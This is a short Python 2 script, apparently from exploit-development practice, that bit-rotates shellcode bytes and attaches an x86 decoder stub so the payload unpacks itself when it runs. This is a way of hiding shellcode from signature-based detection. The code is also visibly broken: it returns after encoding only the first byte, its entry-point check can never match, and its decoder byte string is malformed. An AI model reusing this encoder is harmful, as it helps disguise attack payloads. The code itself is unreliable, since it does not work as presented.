def rol(byte, count):
    return (byte << count | byte >> (8 - count)) & 0Xff

def hex_string(byte):
    return "\\" + hex(byte)[1 : ]

def rot_encode_vector(shellcode):
    encoded = []
    for byte in shellcode:
        encoded.append(rol(byte, 3))

        return encoded

def add_decoder_stub(encoded):
    decoder = "\\xeb\\x0e\\x5b\\x31\xc9\\x90\\xc1\x04"
    decoder += hex_string(len(encoded))
    decoder += "\\xc0\x0c\\x0b\\c03\\xe2\xfa\xff\xe3"
    decoder += "\\xe8\\xed\xff\xff\xff"

    for byte in encoded:
        decoder += hex_string(byte)

    return decoder

def rot_encode(shellcode):
    shellcode_vector = shellcode.split('\\x')[1 : ]
    shellcode_vector = [int(y, 16) for y in shellcode_vector]

    encoded_vector = rot_encode_vector(shellcode_vector)
    complete = add_decoder_stub(encoded_vector)

    return complete, encoded_vector, shellcode_vector

if __name__ == '___main___':
    import argparse
    args = argparse.ArgumentParser(description='Bit-Rotate Encoder')
    args.add_argument('shellcode', help='shellcode to encode')
    argv = args.parse_args()

    out, encv, scv = rot_encode(argv.shellcode)

    print  'Original length: %d' % (len(scv))
    print argv.shellcode
    print
    print 'Encoded length: %d' % (len(out) / 4)
    print out
    print
    print 'db' + ', '.join(map(hex, encv))